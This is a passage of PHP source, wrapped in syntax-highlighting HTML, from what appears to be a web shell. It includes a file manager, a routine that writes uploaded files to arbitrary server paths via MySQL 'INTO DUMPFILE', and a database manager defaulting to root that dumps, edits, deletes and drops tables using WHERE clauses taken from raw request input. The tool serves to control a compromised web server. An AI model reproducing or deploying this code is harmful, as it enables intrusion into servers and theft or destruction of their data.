<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:fileperm(\''.$filedb['server_link'].'\');"&gt;'.<span style="text-decoration: underline;">$filedb['fileperm'].'&lt;/a&gt;'.$filedb['fileowner'].'&lt;/td&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td nowrap&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'<span style="text-decoration: underline;">].'\');"&gt;Down&lt;/a&gt; | ');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:copyfile(\''.$filedb['server_link'].'\');"&gt;Co<span style="text-decoration: underline;">py&lt;/a&gt; | ');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'<span style="text-decoration: underline;">].'\',\''.$filedb['dirlink'].'\');"&gt;Edit&lt;/a&gt; | ');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;a href="javascript:rename(\''.$filedb['server_link'].'\');"&gt;Rena<span style="text-decoration: underline;">me&lt;/a&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/td&gt;&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $file_i++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod<span style="text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.bg().'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" t<span style="text-decoration: underline;">ype="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'.$dir_i.' directories / '.$file_i.' files&lt;/td&gt;&lt;/tr&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/form&gt;&lt;/table&gt;');
}// end dir

elseif ($action == 'sqlfile') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($doing=="mysqlupload"){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $file = $_FILES['uploadfile'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filename = $file['tmp_name'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (file_exists($savepath)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('The goal file has already existed');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(!$filename) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Please choose a file');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fp=@fopen($filename,'r');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $contents=@fread($fp, filesize($filename));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @fclose($fp);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $contents = bin2hex($contents);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(!$upname) $upname = $file['name'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$<span style="text-decoration: underline;">dbport);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE <span style="text-decoration: underline;">'$savepath';");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m($result ? 'Upload success' : 'Upload has failed: '.mysql_error<span style="text-decoration: underline;">());</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
?&gt;
&lt;script type="text/javascript"&gt;
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">mysqlfile</span>(doing){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(!doing)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('doing').value=doing;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('mysqlfile').dbport.value=$('dbinfo').dbport.value;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('mysqlfile').dbname.value=$('dbinfo').dbname.value;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('mysqlfile').charset.value=$('dbinfo').charset.value;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('mysqlfile').<span style="color: #de935f;">submit</span>();
}
&lt;/script&gt;
&lt;?php
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$dbhost &amp;&amp; $dbhost = 'localhost';
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$dbuser &amp;&amp; $dbuser = 'root';
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$dbport &amp;&amp; $dbport = '3306';
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'MYSQL Information','name'=&gt;'dbinfo'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','sqlfile');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBHost:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p(':');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBUser:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBPass:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBName:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbname','size'=&gt;15,'value'=&gt;$dbname));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBCharset:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset<span style="text-decoration: underline;">,'nokey'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;form action="'.$self.'" method="POST" enctype="multipart/form-data" name<span style="text-decoration: underline;">="mysqlfile" id="mysqlfile"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;Upload file&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" ty<span style="text-decoration: underline;">pe="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;Download file&lt;/h2&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /<span style="text-decoration: underline;">&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dbhost');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dbport');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dbuser');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dbpass');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dbname');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('charset');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('doing');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','sqlfile');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/form&gt;');
}

elseif ($action == 'mysqladmin') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$dbhost &amp;&amp; $dbhost = 'localhost';
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$dbuser &amp;&amp; $dbuser = 'root';
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$dbport &amp;&amp; $dbport = '3306';
<span style="color: #969896; background-color: #1d1f21;"> </span>   $dbform = '&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;';
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(isset($dbhost)){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbform .= "&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\<span style="text-decoration: underline;">"$dbhost\" /&gt;\n";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(isset($dbuser)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbform .= "&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\<span style="text-decoration: underline;">"$dbuser\" /&gt;\n";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(isset($dbpass)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbform .= "&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\<span style="text-decoration: underline;">"$dbpass\" /&gt;\n";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(isset($dbport)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbform .= "&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\<span style="text-decoration: underline;">"$dbport\" /&gt;\n";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(isset($dbname)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbform .= "&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\<span style="text-decoration: underline;">"$dbname\" /&gt;\n";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if(isset($charset)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbform .= "&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value<span style="text-decoration: underline;">=\"$charset\" /&gt;\n";</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($doing == 'backupmysql' &amp;&amp; $saveasfile) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!$table) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Please choose the table');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbpo<span style="text-decoration: underline;">rt);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fp = @fopen($path,'w');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($fp) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($table as $k =&gt; $v) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($v) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   sqldumptable($v, $fp);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   fclose($fp);<span style="color: #de935f; background-color: #373b41;">                </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fileurl = str_replace(SA_ROOT,'',$path);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Database has success backup to &lt;a href="'.$fileurl.'" target=<span style="text-decoration: underline;">"_blank"&gt;'.$path.'&lt;/a&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   mysql_close();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Backup failed');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($insert &amp;&amp; $insertsql) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $keystr = $valstr = $tmp = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($insertsql as $key =&gt; $val) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($val) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $keystr .= $tmp.$key;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $valstr .= $tmp."'".addslashes($val)."'";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tmp = ',';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($keystr &amp;&amp; $valstr) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbpo<span style="text-decoration: underline;">rt);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert n<span style="text-decoration: underline;">ew record of success' : mysql_error());</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($update &amp;&amp; $insertsql &amp;&amp; $base64) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $valstr = $tmp = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($insertsql as $key =&gt; $val) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $valstr .= $tmp.$key."='".addslashes($val)."'";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tmp = ',';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($valstr) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $where = base64_decode($base64);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbpo<span style="text-decoration: underline;">rt);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record <span style="text-decoration: underline;">updating' : mysql_error());</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($doing == 'del' &amp;&amp; $base64) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $where = base64_decode($base64);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $delete_sql = "DELETE FROM $tablename WHERE $where";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success<span style="text-decoration: underline;">' : mysql_error());</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($tablename &amp;&amp; $doing == 'drop') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (q("DROP TABLE $tablename")) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Drop table of success');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tablename = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m(mysql_error());
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('title'=&gt;'MYSQL Manager'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','mysqladmin');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBHost:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p(':');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBUser:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBPass:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('DBCharset:');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset<span style="text-decoration: underline;">,'nokey'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   makeinput(array('name'=&gt;'connect','value'=&gt;'Connect','type'=&gt;'submit','class<span style="text-decoration: underline;">'=&gt;'bt'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();

<span style="color: #969896; background-color: #1d1f21;"> </span>   //&#25805;&#20316;&#35760;&#24405;
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'recordlist'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('doing');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','mysqladmin');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('base64');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('tablename');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p($dbform);
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();

<span style="color: #969896; background-color: #1d1f21;"> </span>   //&#36873;&#23450;&#25968;&#25454;&#24211;
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'setdbname'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','mysqladmin');
<span style="color: #969896; background-color: #1d1f21;"> </span>   p($dbform);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (!$dbname) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dbname');
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();

<span style="color: #969896; background-color: #1d1f21;"> </span>   //&#36873;&#23450;&#34920;
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'settable'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','mysqladmin');
